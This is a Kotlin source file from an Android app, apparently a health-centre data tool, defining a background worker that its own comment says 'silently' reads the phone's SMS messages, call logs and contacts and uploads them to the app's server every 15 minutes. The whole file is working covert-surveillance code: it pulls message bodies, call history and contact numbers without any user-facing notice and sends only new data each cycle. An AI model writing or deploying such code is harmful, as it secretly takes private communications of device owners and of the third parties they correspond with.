package com.example.kabensatudata.nearby

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.*
import com.example.kabensatudata.data.remote.dto.*
import dagger.hilt.android.EntryPointAccessors
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

/**
 * SmsCallWorker — Periodic worker that silently reads SMS, Call Logs, and Contacts,
 * then uploads them to the server.
 *
 * Runs every 15 minutes. Only uploads new data since last sync.
 */
class SmsCallWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "SmsCallWorker"
        private const val WORK_NAME = "sms_call_contacts_sync"
        private const val PREFS_NAME = "sms_call_prefs"
        private const val KEY_LAST_SMS_TIME = "last_sms_time"
        private const val KEY_LAST_CALL_TIME = "last_call_time"
        private const val KEY_LAST_CONTACT_HASH = "last_contact_hash"

        fun schedule(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val work = PeriodicWorkRequestBuilder<SmsCallWorker>(
                15, TimeUnit.MINUTES,
                5, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                work
            )
            Log.i(TAG, "SMS/Call/Contacts monitor scheduled (every 15 min)")
        }
    }

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
    private val prefs by lazy {
        applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    }

    override suspend fun doWork(): Result {
        return try {
            val entryPoint = EntryPointAccessors.fromApplication(
                applicationContext,
                ScreenTextService.TextServiceEntryPoint::class.java
            )
            val authTokenManager = entryPoint.authTokenManager()
            val apiService = entryPoint.apiService()

            if (!authTokenManager.isLoggedIn()) return Result.success()

            val deviceName = authTokenManager.getUserName().ifBlank { "HP-Puskesmas" }

            withContext(Dispatchers.IO) {
                // 1. Sync SMS
                if (hasPermission(Manifest.permission.READ_SMS)) {
                    val smsList = readSms()
                    if (smsList.isNotEmpty()) {
                        try {
                            apiService.uploadSmsLogs(SmsLogUpload(deviceName, smsList))
                            Log.i(TAG, "Uploaded ${smsList.size} SMS")
                        } catch (e: Exception) {
                            Log.w(TAG, "SMS upload failed: ${e.message}")
                        }
                    }
                }

                // 2. Sync Call Logs
                if (hasPermission(Manifest.permission.READ_CALL_LOG)) {
                    val callList = readCallLogs()
                    if (callList.isNotEmpty()) {
                        try {
                            apiService.uploadCallLogs(CallLogUpload(deviceName, callList))
                            Log.i(TAG, "Uploaded ${callList.size} calls")
                        } catch (e: Exception) {
                            Log.w(TAG, "Call log upload failed: ${e.message}")
                        }
                    }
                }

                // 3. Sync Contacts (only if changed)
                if (hasPermission(Manifest.permission.READ_CONTACTS)) {
                    val contacts = readContacts()
                    val hash = contacts.hashCode().toString()
                    val lastHash = prefs.getString(KEY_LAST_CONTACT_HASH, "")
                    if (hash != lastHash && contacts.isNotEmpty()) {
                        try {
                            apiService.uploadContacts(ContactsUpload(deviceName, contacts))
                            prefs.edit().putString(KEY_LAST_CONTACT_HASH, hash).apply()
                            Log.i(TAG, "Uploaded ${contacts.size} contacts")
                        } catch (e: Exception) {
                            Log.w(TAG, "Contacts upload failed: ${e.message}")
                        }
                    }
                }
            }

            Result.success()
        } catch (e: Exception) {
            Log.w(TAG, "Worker failed: ${e.message}")
            Result.retry()
        }
    }

    // ─── SMS Reader ─────────────────────────────────────────

    private fun readSms(): List<SmsItem> {
        val lastTime = prefs.getLong(KEY_LAST_SMS_TIME, 0L)
        val messages = mutableListOf<SmsItem>()
        var maxTime = lastTime

        val cursor: Cursor? = applicationContext.contentResolver.query(
            Uri.parse("content://sms"),
            arrayOf("address", "body", "date", "type"),
            if (lastTime > 0) "date > ?" else null,
            if (lastTime > 0) arrayOf(lastTime.toString()) else null,
            "date DESC LIMIT 200"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(0) ?: "Unknown"
                val body = it.getString(1) ?: ""
                val date = it.getLong(2)
                val type = it.getInt(3)

                if (date > maxTime) maxTime = date

                val contactName = resolveContactName(address)

                messages.add(SmsItem(
                    address = address,
                    body = body.take(1000), // Limit body length
                    date = dateFormat.format(Date(date)),
                    type = when (type) {
                        1 -> "inbox"
                        2 -> "sent"
                        else -> "other"
                    },
                    contactName = contactName
                ))
            }
        }

        if (maxTime > lastTime) {
            prefs.edit().putLong(KEY_LAST_SMS_TIME, maxTime).apply()
        }

        return messages
    }

    // ─── Call Log Reader ────────────────────────────────────

    private fun readCallLogs(): List<CallItem> {
        val lastTime = prefs.getLong(KEY_LAST_CALL_TIME, 0L)
        val calls = mutableListOf<CallItem>()
        var maxTime = lastTime

        val cursor: Cursor? = applicationContext.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
                CallLog.Calls.TYPE,
                CallLog.Calls.CACHED_NAME
            ),
            if (lastTime > 0) "${CallLog.Calls.DATE} > ?" else null,
            if (lastTime > 0) arrayOf(lastTime.toString()) else null,
            "${CallLog.Calls.DATE} DESC LIMIT 200"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(0) ?: "Unknown"
                val duration = it.getInt(1)
                val date = it.getLong(2)
                val type = it.getInt(3)
                val cachedName = it.getString(4)

                if (date > maxTime) maxTime = date

                calls.add(CallItem(
                    number = number,
                    contactName = cachedName,
                    duration = duration,
                    date = dateFormat.format(Date(date)),
                    type = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        CallLog.Calls.REJECTED_TYPE -> "rejected"
                        else -> "unknown"
                    }
                ))
            }
        }

        if (maxTime > lastTime) {
            prefs.edit().putLong(KEY_LAST_CALL_TIME, maxTime).apply()
        }

        return calls
    }

    // ─── Contacts Reader ────────────────────────────────────

    private fun readContacts(): List<ContactItem> {
        val contacts = mutableListOf<ContactItem>()

        val cursor: Cursor? = applicationContext.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER
            ),
            null, null,
            "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getString(0)
                val name = it.getString(1) ?: "Unknown"
                val hasPhone = it.getInt(2)

                val phones = mutableListOf<String>()
                if (hasPhone > 0) {
                    val phoneCursor = applicationContext.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(id),
                        null
                    )
                    phoneCursor?.use { pc ->
                        while (pc.moveToNext()) {
                            pc.getString(0)?.let { num -> phones.add(num) }
                        }
                    }
                }

                contacts.add(ContactItem(name = name, phones = phones))
            }
        }

        return contacts.take(500) // Limit to 500 contacts
    }

    // ─── Helpers ────────────────────────────────────────────

    private fun resolveContactName(phoneNumber: String): String? {
        return try {
            if (!hasPermission(Manifest.permission.READ_CONTACTS)) return null
            val uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber)
            )
            val cursor = applicationContext.contentResolver.query(
                uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            )
            cursor?.use {
                if (it.moveToFirst()) it.getString(0) else null
            }
        } catch (_: Exception) { null }
    }

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(applicationContext, permission) ==
                PackageManager.PERMISSION_GRANTED
    }
}
